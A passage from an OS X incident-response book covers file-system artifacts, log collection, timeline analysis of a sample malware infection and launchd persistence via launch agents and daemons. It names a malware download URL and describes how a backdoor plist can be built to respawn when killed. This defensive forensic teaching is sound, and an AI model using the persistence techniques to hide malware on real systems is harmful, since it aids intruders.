with this file from the .vol directory using “cat /.vol/<volumeID> <inode>”.
However, you will notice that if you run “ls” on the /.vol directory, no files are listed.
/bin
Holds command-line binaries. The most basic and commonly executed com-
mands used from the terminal are stored here (cat, ls, echo, ps, pwd, etc).
/usr
Stores configurations and additional system binaries.
/cores
This folder may or may not exist. It’s used is used to hold core dumps.
/sbin
Contains essential system binaries. These are binaries that are more likely re-
lated to administration.

CHAPTER 4: 
File System
64
/dev
Short for “device”. Unix treats everything as a file which is why you will see 
hardware devices stored in here. You may even see files related to known Blue-
tooth connected devices.
/etc
This directory contains a plethora of configuration files. It’s easy to get lost 
in here because there are so many files. Programs and services that are in-
stalled should store their configurations in here. /etc/ is a symbolic link to 
/private/etc
/tmp
A place where apps and programs can write temporary files. The “periodic” 
process will delete files in this directory after 3 days by default. This location is 
actually a soft link to /private/tmp.
/private
There isn’t any documentation regarding the private directory. You’ll notice 
that a lot of the aforementioned directories such as /etc, /tmp, and /var are 
actually just symbolic links that point to the private directory.
/var
Holds log files. We will be collecting a lot of files from this location for analy-
sis. The Console application is the easiest way to view these logs on a local 
system. Many of the files inside the /var directory are files that are constantly 
changing or being updated.
MISCELLANEOUS FILES
Hidden Files and Directories
Just like Linux, files on OS X that start with a “.” are hidden files. This means 
that they will not be visible when browsing with finder. To see hidden files, 
you must go to the terminal and run “ls -a”. Directories that start with a “.” are 
also hidden.

File Artifacts
65
.DS_Store
You will find this file in any directory that you’ve browsed to with Finder. 
This file exists to hold attributes and customizations of the directory which it’s 
stored in. These attributes can be things like icons, views, and finder colors. As 
you can see it starts with a period and is therefore a hidden file.
.Spotlight-V100
This folder is created in the root directory of every volume on the system. It 
contains the index information for reference by Apple’s file search tool Spot-
light.
.metadata_never_index
If this file is at the root of a volume, Spotlight will not index that volume. 
A good example of this is the Recovery Partition.
<FolderName>.noindex
Files and folders that end with the extension “.noindex” will not be indexed by 
Spotlight. Malware authors could potentially use this extension to ensure their 
malware does not show up unexpectedly in a Spotlight search.
FILE ARTIFACTS
There are a number of locations on the hard drive we can look to access im-
portant information related to our investigation. These files contain all sorts 
of history and current settings related to the system. Almost all of these files 
store a timestamp in which their events occurred, the downside is that the 
timestamp may be stored in a different format and a different column in each 
log, so bringing them all together into one file can sometimes be a headache. 
Some data specific to OS X is also not stored in the standard Unix Epoch time 
(the number of seconds since January 1, 1970, 00:00:00). Instead it may store 
data in “Mac Absolute Time” which is calculated by the number of seconds 
since January 1, 2001, 00:00:00. Since we are not imaging the hard drive and 
won’t have file contents available to us, we have to pick and chose which files 
to copy for analysis.
Logs and Rotation
A vast majority of programs running on OS X output their data to a log file. 
Apple provides a number of technologies that allow users to create verbose 
logs for debugging as well as providing historical information. Many of these 
logs are meant to be viewed in the Console app built into OS X. The ­operating 

CHAPTER 4: 
File System
66
­system handles the log rotations (compressing, archiving, and deleting old 
logs). When logs are rotated they are commonly compressed and given an 
obvious naming scheme that increases numerically.
Here we can see that the currently active systemlog is just called “system.log”. 
The logs that are older than 1 day have been compressed using gzip. All of this 
to say, when you’re collecting a log that you find useful, make sure to collect 
the rotated ones as well.
KEY FILE ARTIFACTS
In the following section we will discuss some of the important file-based ar-
tifacts that exist on the system. Use your best judgement on the files and logs 
you will find most useful. Some of these items won’t be discussed in full until 
later chapters.
~/Library/Preferences/com.apple.LaunchServices.
QuarantineEventsV*
This is an SQL database that holds information about files downloaded via a 
web browser. It works with the com.apple.quarantine extended attribute tag 
we saw earlier.
~/.bash_history
Most Unix users are familiar with this file. It contains a large listing of the most 
recent commands executed via bash shell. However, just because a command 
is executed via bash does not mean it will end up in the bash history. Bash 
interactive sessions will write to this file after the shell exits.

Key File Artifacts
67
/etc/profile
Can be used to modify your bash environment upon loading an interactive 
bash session. This can include things like variables commands and functions. 
It could also point to bash debug scripts which may allow for hooking inside 
of different executables. Variables and functions assigned in this file apply to 
interactive bash sessions system wide.
/etc/bashrc
By default this file is imported by /etc/profile and can contain additional vari-
ables and functions. Also applied system wide.
~/.bash_profile | ~/.bash_login | ~/.profile | ~/.bashrc
These are additional files that will allow for adding of variables and functions 
to the bash shell upon load. Some may only be loaded only under certain cir-
cumstances, but we will want to collect all of them to check for any suspicious 
code that might be used for launching executables when bash is opened.
~/.bash_logout
Can hold a list of commands to execute when a user logs out of a bash shell
/var/log/system.log
The main OS X system log. Many details can be located here regarding operat-
ing system errors and security logging. Modern day OS X versions also store 
ssh, ftp, and other valuable logging information in here. This is probably the 
most useful log from a security perspective and it should be considered a red 
flag if its usage has been disabled. com.apple.syslogd.plist is responsible for 
the execution of syslogging at startup. You can ensure that syslogging hasn’t 
been disabled by searching for com.apple.syslogd inside of the “launchctl list” 
output while logged in as root.
/private/var/log/asl/*.asl
Inside this folder is a series of important logs called the Apple System Logs. 
These are essentially an alternative to system.log and may contain even more 
valuable information. Perhaps their best feature is that they contain a year with 
the timestamp which most other logs do not. Instead of collecting the raw logs 
you can print them ordered by UTC timestamp using syslog -T UTC.
~/Library/Preferences/com.apple.recentitems.plist
This file holds recently accessed files and applications that the user has ac-
cessed via the “Finder” application. You can either copy the whole file or print 
it using the defaults command.

CHAPTER 4: 
File System
68
~/Library/Preferences/com.apple.finder.plist
This plist holds a number of details regarding the Finder app and what the user 
sees when they open it. Odds are this information won’t be incredibly useful 
to you but it’s there just in case. You can either collect the whole file or you can 
easily print its contents using the defaults command.
~Library/Preferences/com.apple.loginitems.plist
This file can hold a number of items to launch upon system startup. We will 
discuss it in the next chapter.
~/Library/Logs/DiskUtility.log
This is the log file for the DiskUtility App. You can find information regarding 
when drives were formatted including USB drives.

Key File Artifacts
69
/Library/Preferences/SystemConfiguration/com.apple.
airport.preferences.plist
This plist contains data about wireless access points the system has con-
nected to. There may only be a few times where this data is needed, but it 
certainly doesn’t hurt to have it handy. The “LastConnected” key is particu-
larly useful as it contains the timestamp of the last time each wireless point 
was connected to.
/private/etc/resolv.conf
Contains a list of specific DNS nameservers for the system to use.
/private/var/db/launchd.db/com.apple.launchd/ 
overrides.plist
We will explain this file fully in the system startup and scheduling chapter. For 
now just know that this file contains a list of launch agents that have been per-
manently unloaded. A malicious use case would be if an attacker permanently 
disabled the syslog plist. If the syslog was disabled you would then see an entry 
like the following in overrides.plist:

CHAPTER 4: 
File System
70
/private/etc/kcpassword
If auto login is enabled, this file will exist and it will hold the user’s login pass-
word masked with an XOR key. We will talk more on this file in the privilege 
escalation and password dumping chapter.
/private/etc/sudoers
This file holds a list of users who are allowed to login as the root account.
Notice that Apple by default allows any users in the admin group to escalate 
to root (given they know the password). When creating a new user, you will 
be given the option of whether or not you want that user to be part of the 
admins.
/private/etc/hosts
This file force resolves IP addresses to domains. It’s not used nearly as much as 
it used to be. Some security software will even use this file to redirect known 
malicious IP addresses to nowhere so that the malware is unable to communi-
cate with its command and control server.
/private/var/log/fsck_hfs.log
This file holds a log of the fsck_hfs utility which is used for running checks and 
repairs on HFS+ file systems.

Key File Artifacts
71
/Library/Logs/AppleFileService/AppleFileServiceError.log
This log displays errors related to Apple Filing Protocol which is a protocol 
used for sharing files across devices. Although Apple now focuses on sharing 
files over SMB, AFP is still available on the system.
/var/log/apache2/access_log
The apache log that reveals activity performed on the web server. This probably 
won’t be of interest to you unless you’re dealing with OS X Server. If you are 
running a web server this log is an absolute must have.
/var/log/apache2/error_log
The Apache error_log. Various errors regarding the httpd service will appear in 
here.
/var/log/opendirectoryd.log
Open Directory is a launchd process that allows OS X access to a variety of 
directory servers. Third party modules can also be written for Open Directory.

CHAPTER 4: 
File System
72
/var/log/wifi.log
This file holds results about different wireless details. If you’re in search of 
whether or not the user was on the company network at the time of compro-
mise this would be a good place to start. This file includes more than just wire-
less internet results. It also includes information on other wireless connections 
such as Bluetooth.
/var/log/appfirewall.log
If the user has enabled the Application Firewall you will find the log results 
printed here. When the application firewall is enabled (system settings > se-
curity and privacy > firewall) it uses its own pfctl rule to accomplish its tasks.
/var/log/hdiejectd.log
Holds a number of errors that are logged when drives fail to unmount cor-
rectly.
/var/log/install.log
Holds a number of details about app updates, upgrades, and installs.

Collection
73
/var/audit/*
The logs inside /var/audit/ are in relation to the auditd daemon. Auditd is a 
powerful auditing tool that can monitor a number of items at the kernel level 
on your system. The user is able to configure the level of its verbosity. By de-
fault, it will record items such as when root logins are attempted and when a 
user changes their password. These files are stored in a binary format and can 
be read using the praudit command. If you do not have praudit available on 
your analysis system, you will want to consider parsing these files during your 
collection.
COLLECTION
Timestamps
While collecting a file listing of the hard drive, we will store all file timestamps 
in UTC format. We will also convert all the timestamps inside of our logs to 
reflect UTC. This is encouraged for a number of reasons. The most important 
reason being that at the end of your analysis you will want to create a timeline 
for all the systems that were compromised. This helps you view the intrusion as 
a whole in story line format. If all your data is stored in UTC format a timeline 
is easy to build. If your data is not in UTC format you will have to keep a list of 
each system and its according timezones and later convert it to UTC manually. 
This will take up a lot of valuable time and could lead to errors in your intru-
sion timeline.
If you would prefer not to convert timestamps to UTC you can adjust the code 
accordingly.
Getting a File Listing
Having a list of all files on the hard drive is critical to an investigation. 
Given that every file contains four different timestamps, in a way the file 
system is able to tell us a story about what files were being handled and 
when. This will become even more powerful when we enrich it with ad-
ditional entries from various logs. Remember that this book will not focus 

CHAPTER 4: 
File System
74
on creating a forensics image, and therefore you will not have physical ac-
cess to every file on the hard drive. If we were to collect every single file on 
the disk, we would end up with a forensic image that is a very large size. 
Nowadays it’s not uncommon for OS X users to have a terabyte of data on 
their hard drive. Our goal here is to grab the necessary information relevant 
to our investigation.
So let’s focus our efforts on something that’s still effective and far less time 
consuming. Let’s create a python script that can walk across hard drive and 
collect all file names along with some of their basic info. We’ll create two 
separate files. One that holds timestamps and filenames and another that 
holds filenames, permissions, file types, owner id, group id, and size. We will 
also include an option that allows for md5 collection of files. Having the 
hash for each file will be of great assistance to us particularly when scanning 
this file listing with our Yara rules. The reason we are making it optional is 
because collecting md5s for each file will likely double the script runtime at 
minimum. Finally, we will add the option to whitelist specified directories 
so the analyst can choose to ignore the ones they don’t want to collect. For 
instance, I may choose not to collect everything in the Xcode.app directory 
because Xcode is filled with a large number of small files related to develop-
ment (Fig. 4.4).
FIGURE 4.4

Collection
75

CHAPTER 4: 
File System
76
When running this script without md5 collection across an almost full 500 GB 
hard drive this took about 11 min to run (i7 2.4 GHz). When adding in hash 
collection it took around 40  min. As stated before, hash collection takes a lot 
of additional time, but it can be worth the trade off. The speed of this script will 
depend greatly on the amount of files on the hard drive. When running it you 
need to include a starting location and a directory to dump the contents to.
python file_walker.py -s / -d collection

Collecting File Artifacts
77
The catch
The obvious downside to this approach is that the names of deleted files will 
not appear inside the file listing that we have built. In theory, to get a list of 
deleted file names and attributes you would have to pull the raw catalog file 
from the file system and parse it separately. Doing so is outside the scope of 
this book and at the time of writing, no such tool exists.
COLLECTING FILE ARTIFACTS
We also need to write up a quick script that will collect the file artifacts and 
logs we’ve covered in this chapter. This is as easy as copying a file or directory. 
Just like in the last chapter, we will be using ditto to collect the files we want 
(Fig. 4.5).
FIGURE 4.5

CHAPTER 4: 
File System
78

Analysis Scripting
79
The updates we’ve added to our collection framework should look similar to 
the following (Fig. 4.6).
FIGURE 4.6
ANALYSIS SCRIPTING
We can now take the artifacts that we’ve collected and begin ripping them 
apart, but before we get started we need to create a few new scripts that will 
take our new data and put it in a more useful format. Both the logs and the file 
data that we’ve collected all contain timestamps. Taking the timestamps of the 
most useful logs and sorting them into a file, will allow the operating system 
to tell us the story of what took place over the course of a few days (or however 
far back your logs are set for). You’ll notice that most the logs we’ve collected 
store their timestamps in a similar fashion.
Aug 30 23:59:54

CHAPTER 4: 
File System
80
We can take these timestamps and convert them to the same format as our file 
system making it easier to correlate the two. This script will convert timestamps 
for the majority of the logs along with the quarantine database. The only issue 
as mentioned before is the fact that these timestamps do not contain a date. 
There are a number of workarounds that can be done to accomplish this, but 
for simplicity’s sake we will just mark each timestamp with the current year. 
This will obviously present a problem if collecting log files around the first 
week of January as logs from December will get marked with the wrong year. 
It’s up to the reader to correct this small problem if they chose.

Analysis Scripting
81
After running this script have a new file called storyline.txt which contains an 
unsorted list of timestamps. We now have two different files that need to be 
sorted. The first is storyline.txt. The second is the file listing information that we 
collected (we called it filetimeline.txt). You can either merge these files together 
to tell one big story, or you can keep them separate and search through them 
individually. Since filetimeline.txt could be up to a gigabyte or even larger, add-
ing more data to it will increase the amount of time it takes to search through 
it. For this reason, we will keep them separate. Now that every line begins with 
a timestamp, the easiest way to sort these files is by using the sort command.

CHAPTER 4: 
File System
82
ANALYSIS
In the last chapter we left off with a handful of suspicious processes and net-
work connections that all spawned from an app named security_update.app. It 
only makes sense that we start by looking for this file in our file listing. Keep in 
mind that items with a .app extension are actually directories. So grepping for 
this app should reveal all files that are contained within it.

Analysis
83
Sure enough, we see there is a large number of files contained in this directory. 
Most of which are python libraries (this snippet includes only a handful of 
them). If you look closely at the aforementioned output, you’ll notice a few 
files of interest.
When dealing with attackers, it is not uncommon to encounter files with ex-
tremely short naming conventions. If malware is well written, sometimes poor 
file naming schemes like this may be the biggest giveaway that an attacker was 
on the system. Right now we are not able to determine what is inside of these 
files. Later, we can either go back to the compromised system and collect them, 
or we can try searching for the file names inside of memory. We will cover this 
in the memory analysis chapter.
Let’s have a look at the filetimeline.txt to see if we can determine what 1.txt is.
These timestamps are all relatively close together, but the file appears to have 
be modified on 2015-12-11-07:10:48. This could be interesting. Now my ques-
tion is, did any other files on the file system get accessed, changed, or modified 
around this time? We can easily find out by searching for the timestamp inside 
filetimeline.txt. Let’s take a look at everything that happened inside a 1 min 
window starting at 07:10.

CHAPTER 4: 
File System
84
This is actually very interesting. Surrounding the timestamps for the 1.txt 
file is crlcache.db and a binary called vmmap. Crlcache.db is related to the 
keychain certificate revocation cache and vmmap is a tool used to read re-
gions of virtual memory. A known tool called keychaindump uses vmmap 
in attempts to decrypt keychain passwords in memory. Based on the file 
timeline we’re looking at, 1.txt could contain the output of a keychaindump 
attempt and the file named “kd” could actually be the keychain dump tool 
(we will touch more on this in the privilege escalation and passwords chap-
ter). These are of course assumptions based on what we’re seeing on the file 
system.
In the last chapter we also discovered a file called iTunesBackup. This file was 
the first item in the chain to be executed by security_update.app. Let’s take a 
quick look for it on the timeline.
The first notable item regarding this output is that iTunesBackup exists inside a 
hidden folder. First we see this file was written to disk at 6:55:49. The changed 
timestamp is recorded as 1 s following that. Keep in mind that “changed” time-
stamps are updated when metadata such as permissions are changed. Based on 
this 1 s difference we could assume that the file landed on the file system at 
06:55:49 and then permissions (such as execute permissions) were modified 
immediately after. It is not unlike malware to do this; however, this is just an 
assumption based on the timestamps.
Our malware process tree shows a python script called iTunesSupport being 
executed by iTunesBackup. Let’s do a quick search for iTunesSupport as well.
This file’s birth timestamp occurs 4–5 s after the iTunesBackup birth time. Giv-
en that we’ve seen two malicious files hit the hard drive around this time we 
could assume that this was the time of installation. Let’s take a look at what 
else happened at 2015-12-11T06:55:55.

Analysis
85
We see a number of other files being touched and accessed at the exact same 
second as iTunesSupport. Perhaps the most interesting is “/Users/mike/Li-
brary/LaunchAgents/com.apple.iTunesHelperModule.plist”.
This property list is located in Mike’s LaunchAgents directory. A launch agent 
ensures that a specified process is created when a user logs in. This means 
our malware has likely scheduled itself to run at startup. We also see another 
critical startup item “overrides.plist” being modified, but we will take a deep 
dive into launch agents in the next chapter. Given the large amount of events 
in this 1 s time frame it seems we’ve found our installation time. Now we’ll 
take a look at the log files to see if they contain any chatter around this 
same time frame. Assuming you’ve used the storyline.py script we built in 
the aforementioned section of this chapter, you should have a nice list of log 
activity that includes timestamps (sed G double spaces our results for better 
readability).

CHAPTER 4: 
File System
86
Searching the entire minute of 06:55 in storyline.txt reveals an entry from the 
quarantine log that shows our malware in question was downloaded from 
Google Chrome about 20 s before it was executed. What’s even better is that 
thanks to the quarantine log we can see the URL this malware originated from 
without even peeking at the actual Browser History. http://secupdat.com/
security_update.zip.
Note that also in the aforementioned output we see security_update entering 
items into the syslog. This is likely not intentional by the malware author. 
Background processes will sometimes print statements and errors to the syslog 
since there is nowhere else to print them. Let’s take a look to see if security_up-
date holds any other information inside the storyline.
This reveals four entries total. The first two entries we have already seen. The 
third entry shows us that the attacker attempted to run the root shell at 2015-
12-11T07:07:07. This was caught in the syslog because an entry is created every 
time sudo is executed. Searching for additional activity around this timestamp 
reveals minimal activity. What about the second entry. This is an interesting 
one. This appears to be a syslog entry for the mds process. This process is re-
sponsible for various Spotlight indexing tasks. It’s referencing a file path that 
we are observing for the first time called osx_patch.
/Users/mike/Downloads/security_update.app/Contents/Resources/osx_
patch
Does osx_patch appear in my file listing?

Analysis
87
Interestingly enough, it does not. It appears that whatever osx_patch was, it has 
been removed. Let’s take a look at what happened on the file timeline during 
the 10 s time window of the osx_patch syslog entry.
Still not much luck. The time window reveals a lot of generic application chat-
ter and a number of Apple System Logs being modified. The only other thing 
noteworthy is that there are a few references to SMB in here. Before we stop, 
let’s check to see what is happening in the logs around this time.

CHAPTER 4: 
File System
88
Surrounding the mds error that we saw earlier, we see two network/dns based 
errors. Dnssd Domain Name Service System Discovery is commonly used for 
two systems that are communicating. Is it possible osx_patch was some type 
of share? We will investigate this matter in later chapters. Given the new items 
brought to light in this chapter we can update our malware tree to include 
more details (Fig. 4.7).
FIGURE 4.7

Conclusion
89
CONCLUSION
In this chapter we took a look at the different file-based artifacts and where 
they exist on the operating system. Analyzing the files and their timestamps is a 
game of trial and error. If files relevant to our investigation have been accessed, 
modified, or changed since the attacker last used them, they may not align with 
the rest of the timeline making analysis much more difficult. Both the logs and 
the file timeline help put together the story of what occurred. You’ll find analy-
sis to be much more difficult if you’re missing one of these two items. We’ve 
discovered quite a bit of information after starting with only a few suspicious 
file names. In the next chapter we will focus on determining how this malware 
is surviving system reboot.
Yara rule of indicators discovered in this chapter.
Further Reading
http://www.e7z.org/open-xar.htm
http://www.dfrws.org/2008/proceedings/p76-burghardt.pdf - lots of hfs details.
http://osxdaily.com/2009/12/31/what-is-a-ds_store-file/
Book – “how linux works” regarding file types.
http://www.gnu.org/software/libc/manual/html_node/Overview-of-Syslog.html

91
OS X Incident Response. http://dx.doi.org/10.1016/B978-0-12-804456-8.00001-7
Copyright © 2016 Elsevier Inc. All rights reserved.
System Startup and Scheduling
CHAPTER 5
INTRODUCTION
The OS X startup process is a well-developed one. If you’ve worked with Unix 
services before you will find a few startup and scheduling mechanisms you’re 
already familiar with such as rc scripts, cron, and at. Although some of these 
items still work on OS X they are not the preferred method of persistence. 
This chapter will focus on the available persistence mechanisms and how they 
operate so that the responder is able to determine when malicious scheduling 
has been applied. An auto start extensibility point (ASEP) is a location on the 
system that could lead to the execution of a binary without user interaction. 
The main auto start extensibility points (ASEPs) in the OS X environment take 
the form of Property Lists or “plists”. Property lists are used for storing all sorts 
of data on OS X such as app settings and operating system specific settings. 
They can be found all over the system, but there are only a handful that are 
searched and loaded when OS X starts up. Any user is capable of creating a 
launch agent in their own environment. Just like the Windows Registry, these 
files sit in a location where most users will not bother opening. The vast ma-
jority of malware variants achieve persistence using the ASEPs we will discuss 
in this chapter.
SYSTEM BOOT
Although this chapter will focus on how persistence works at the Operating 
System level, it’s good to have a high level understanding of what happens be-
tween when you press the power button, and when the OS is loaded. Exploita-
tion of the boot process has led to the possibilities of rootkits and bootkits in 
the past. Although these exploits are incredibly dangerous, they are also quite 
rare. Here is high level overview of the boot process (Fig. 5.1).

CHAPTER 5: 
System Startup and Scheduling
92
j	 EFI Boot ROM
j	 After pressing the power button code is loaded from the computer’s 
flash ROM to bootstrap the system.
j	 EFI booter
j	 Code from boot.efi is loaded from the system volume at /System/
Library/CoreServices/boot.efi and executed.
j	 XNU KernelCache
j	 Boot.efi loads the XNU Kernel. OS X prelinks the kernel and its 
startup drivers to speed up the boot process. This is what’s known as 
the kernel cache.
j	 launchd
j	 The first userland process started by the kernel which all further 
processes are descendants of.
For those wanting to learn more about bootkits, doing a Google search for 
“Thunderstrike bootkit” would be a great way to start.
LAUNCHD—THE BEGINNING AND END
The process responsible for reading ASEP-related property lists and carrying out 
the execution of their settings is called “launchd” located in the /sbin directory. 
Launchd is the first process executed by the OS X Kernel at startup and the last 
one to finish at shut down. This process should always be running as PID 1.
Each user on the system will also have their own launchd process running at 
the user level. However, the launchd process owned by root is the only one 
that cannot be killed.
It’s important to note that ASEP property lists do not execute. They simply 
point to executable programs and supply a number of other settings for 
launchd to work with. Launchd is the process responsible for executing bi-
naries after locating them in their property list settings. At system startup 
launchd goes through the following directories and reads the .plist files con-
tained inside them.
FIGURE 5.1

Launch Agents Versus Launch Daemons
93
j	 Privileged Level
j	 /Library/LaunchAgents—Per-user agents installed by the admin
j	 /Library/LaunchDaemons—System-wide daemons installed by the 
admin
j	 /System/Library/LaunchAgents—Per-user agents provided by Apple
j	 /System/Library/LaunchDaemons—System-wide daemons provided 
by Apple
Any binary that is executed as a result of the aforementioned property lists is 
done so with root privileges. A root level property list may also specify a spe-
cific user to execute a process as.
When a user logs into their system, property lists contained in the following 
directory are loaded by the user level launchd process.
/Users/$USER/Library/LaunchAgents
Any binary that is executed as a result is done so with the newly logged-in 
user’s permissions.
LAUNCH AGENTS VERSUS LAUNCH DAEMONS
Launch agents and daemons are very similar. The main difference is that agents 
are loaded upon user login as where daemons are loaded at system startup. For 
instance, if an SSH server is setup on a system it will be running as a daemon. 
SSH needs to be running even when no users are logged in. This way remote 
users can access the system at all times, whereas an agent such as the music cli-
ent Spotify, only needs to be running when the user who installed it is logged 
in. Agents can also allow the usage of GUI tools as where Daemons should be 
running strictly in the background.
Let’s take a look at a few more examples:
j	 com.oracle.java.Java-Updater.plist
j	 This property list schedules a binary that checks for java updates. It 
needs to run with root permissions, but it only needs to run if a user is 
logged in. Therefore, it would go in the /Library/LaunchAgents directory.
j	 com.apple.screensharing.agent.plist
j	 This property list points to some of the screen share functionality 
built into OS X. A user can only share their screen if they’re logged 
in. This plist is also provided by Apple. For these two reasons, it’s 
stored in /System/Library/LaunchAgents
j	 com.jamfsoftware.jamf.daemon.plist
j	 jamf is third party enterprise management software and allows an 
admin to access a computer whenever needed. It needs to be running 
before any users are logged in. Therefore, it is saved in /Library/
LaunchDaemons/

CHAPTER 5: 
System Startup and Scheduling
94
j	 com.apple.syslogd.plist
j	 The property list that points to the execution of the syslog binary  
and is installed with the OS X operating system. It needs to be 
executed before any users are logged in so that all activity can  
be logged. Given these two facts, this property list is located in  
/System/Library/LaunchDaemons.
j	 com.citrixonline.GoToMeeting.G2MUpdate.plist
j	 Citrix Go to Meeting is an application used for VOIP-based internet 
meetings. It’s a user level application that will check if a new update 
has been released. It does require root permissions and only needs to 
run if a user is currently logged in. For these reasons it goes in the  
/User/$USER/Library/LaunchAgents directory.
There are very few use cases where launch agents need to be loaded before 
login. Apple calls these PreLoginAgents. The Apple Developer Library gives an 
example use case where a developer is trying to provide assistive technology at 
login. PreLoginAgents have to be designed specifically for running at the login 
screen. They can still be found in /Library/LaunchAgents. An attacker is much 
more likely to use a launch daemon since that’s what they’re designed for. One 
malicious scenario where a PreLoginAgents could potentially be used is if an 
attacker was able to create a fake login window upon system start to capture 
credentials.
BREAKING DOWN A PROPERTY LIST
A property list is nothing more than a file containing xml content. Although 
having xml knowledge will help the understanding of its contents, it’s not hard 
to catch on quickly. Following is an example of a minimalistic launch agent 
provided by the Apple Developer Library. It creates a file called “helloworld” 
in the /tmp directory every 300 s.

Breaking Down a Property List
95
There are a few key things to note here. Let’s break this plist down to its differ-
ent items.
The label key is just a unique identifier. Note that this does not have to match 
the property list file name.
Next is the ProgramArguments key. Below this key the developer provides the 
command or program they wish to run along with the necessary arguments.
Finally, the StartInterval key in the hello world example is optional, but if it’s 
used it will launch the program every specified number of seconds.
There is an optional key that was not used in the hello world property list ex-
ample which is the RunAtLoad key.
When setting this key to true it will ensure that the program is executed at sys-
tem startup rather than waiting for the StartInterval.
Let’s take a look at a property list more likely to be related to malware.

CHAPTER 5: 
System Startup and Scheduling
96
This property list will run a binary called “iphotoHelper” at system startup. Af-
ter launchd starts iphotoHelper, it will check every 800 s to see if iphotoHelper 
is still running. If it’s not running it will start it again. A malware author might 
choose to take this approach so that if his backdoor is killed it will make a 
stealthy restart after a bit of waiting (assuming it hasn’t been deleted).
The malware author may even choose to get more creative and create two 
property lists. One responsible for executing the backdoor and the other that 
checks to see if it still exists and is running.
For malware authors who value a constant connection rather than stealth, 
there is another key that can be used in the property list called “KeepAlive”. 
The “KeepAlive” key can take a few different options. We will focus on the Suc-
cessfulExit option. SuccessfulExit takes a true or false Boolean. When it’s set to 
true, the program will be immediately restarted if it ends successfully. When 
it’s set to false it will be restarted only if it exits unsuccessfully. In our scenario 
with the “iPhotoHelper” property list, if the backdoor closes that means either 
it crashed, or it was forced to quit. Either way, it will have exited unsuccessfully. 
By setting the SuccessfulExit option to false, the backdoor will re-execute im-
mediately under the rare circumstance that it is found and/or killed.
Using the items we’ve discussed previously, a potential malicious property list 
might look like so.

launchctl
97
Using this property list the iphotoHelper binary will restart immediately if it 
exits with a nonzero return code. The only way to stop it would be to delete 
(or move) the iphotoHelper binary, or to unload the property list (discussed 
later).
BINARY PROPERTY LISTS
Binary property lists (bplists) are property lists saved in binary format. They 
are a smaller file size than the traditional xml property lists and don’t display 
in plain text, making them more desirable from a malware perspective. Fortu-
nately for us, binary property lists can be converted to xml on the fly using the 
built in Apple command line tools “plutil”, and PlistBuddy.
Alternatively binary property list data can be read and printed using the “de-
faults read” command. When collecting property list files for forensic analysis 
you can either collect all files and convert them later, or you can convert them 
on the fly as you collect.
LAUNCHCTL
Just because you’ve placed a property list in one of the startup locations does 
not mean it will immediately be loaded by launchd. You have two options to 
load it. You can either wait until the next reboot (or the next login for user-
based launch agents), or you can force the property list to load by using the 
“launchctl load” command. Launchctl is a command line tool built into OS X 
for communicating directly with launchd. We can tell it to immediately load a 
new property list with the following command:
Any property list can be unloaded by using “launchctl unload”.
Make note that unloading a property list will also end the processes that it 
points to.

CHAPTER 5: 
System Startup and Scheduling
98
It’s a good idea to keep an eye out for launchctl commands inside the strings 
memory. Remember that it’s highly likely an attacker will force the loading of a 
plist upon initial execution of his backdoor since he will not want to wait until 
the next restart to receive a connection.
It’s also important to note that a file does not need to have a .plist extension in 
order to be loaded by launchd. However, if the .plist extension does not exist 
you will have to force it to load. Let’s say I’m trying to load a property list called 
“iphoto” instead of com.iphoto.plist. Here’s the results.
However, launchctl load has a -F switch available that will force the loading of 
a plist despite this error message. The following command will execute with 
no errors:
The only issue with this approach is that the property list will not execute when 
the system is restarted. For this reason, it is unlikely you will see an attacker 
drop a launch agent or launch daemon without the .plist extension.
LISTING ACTIVE PROPERTY LISTS WITH LAUNCHCTL
It is very important that during your collection of forensic evidence you include 
the “launchctl list” command in your scripts. This command shows the launch 
agents and daemons that are currently loaded by launchd. The results you get 
back from this command will depend on the user whom you are running it as. 
This means that running “launchctl list” as root will only display the launch 
agents and daemons loaded by the root user. During collection, you will have 
to use the “su” command to change users and run “launchctl list” for each user 
separately. Here is a small snippet of my launchctl list output.

Property List Overrides
99
The far right column is the label found inside of the property list. This label 
should give you an idea of what software that this property list interacts with. 
The far left column is the PID column. It tells you what PID was created as a re-
sult of the loaded property list. If the pid is a dash that means the process is not 
currently active. Finally, there is the Status column, which shows the exit code of 
the last time the process was executed. Zero meaning execution was successful.
EDITING PROPERTY LISTS USING DEFAULTS
You don’t have to open a property list in a text editor in order to view or mod-
ify it. The “defaults” command was created to read property list files or to write 
new changes. Using the defaults command to read a property list will output 
results much easier on the eyes compared to raw XML. For example, let’s run 
the “defaults read” command on the Apple “hello world” example that we 
first looked at. To use the defaults command on a file, you need to include the 
entire file path. Including the .plist extension is optional.
As you can see, this is much easier to read than having to parse through the 
additional xml chatter. Apple refers to this as the “old-style” format or ASCII 
format as opposed to the traditional XML format. This format was used in 
earlier versions. As you run into larger property lists you may find it difficult to 
go without the defaults command. Another huge benefit of the defaults com-
mand is that it will print out property list data in plain text even when han-
dling a binary property list which saves us the hassle of converting it to XML.
As mentioned, you can also use the defaults command to add to a property 
list using “defaults write” or delete the contents by using “defaults delete”, but 
be careful. Modifying unknown property lists with the defaults command can 
lead to a broken system.
PROPERTY LIST OVERRIDES
If the user wishes to stop a specific property list from loading at startup but 
does not want to delete it, they can accomplish this in a few different ways. 
The first and most obvious is to delete or move the property list to a different 

CHAPTER 5: 
System Startup and Scheduling
100
directory. The second option is to keep the property list and create an entry 
for it in the launchd override file. This file’s purpose is to keep property lists 
in the startup directories from being loaded. It contains a list of labels and a 
disable key/value entry. The user level overrides can be found at the following 
location:
/var/db/launchd.db/com.apple.launchd.peruser.<uid>/overrides.plist
where <uid> is the user’s user identification number (see the id command).
The launch agent and launch daemon overrides belonging to root can be 
found at following:
/var/db/launchd.db/com.apple.launchd/overrides.plist
Let’s take a look at what a disabled property list entry looks like inside the 
overrides.plist file.
This overrides.plist entry shows the apple smb service. The fact that the “Dis-
abled” key is set to true tells us that even though this property list is a system 
startup location it will not be loaded at system start. Even if we try to load it 
manually it will result in this error.
First off, if we want to push through this error and load this plist just once, we 
can use the force switch which is -F.
This will ensure that the smb property list is loaded regardless of the disabled 
key. Once the system is restarted, however, that property list will not be loaded 
because the overrides file still remains the same.
You do not have to edit the overrides file directly to flip a disabled property list 
from true to false. You can do it on the fly with the launchctl load command. 
The -w switch will load a property list and flip its value inside the overrides file. 

Crontab
101
If I wanted to start the smb service and ensure that it starts at every reboot I 
would use the following command:
The overrides.plist entry would now look like the following entry, resulting in 
the loading of the smbd service at every reboot.
Note that if a property list label does not exist inside the overrides file, it will 
be loaded at startup by default.
CRONTAB
Cron is a popular Unix tool for executing scheduled tasks. OS X still allows 
the use of cron as a scheduling tool. This technique isn’t abused as frequently 
anymore, but it has been used in the past by a variant of the malware known 
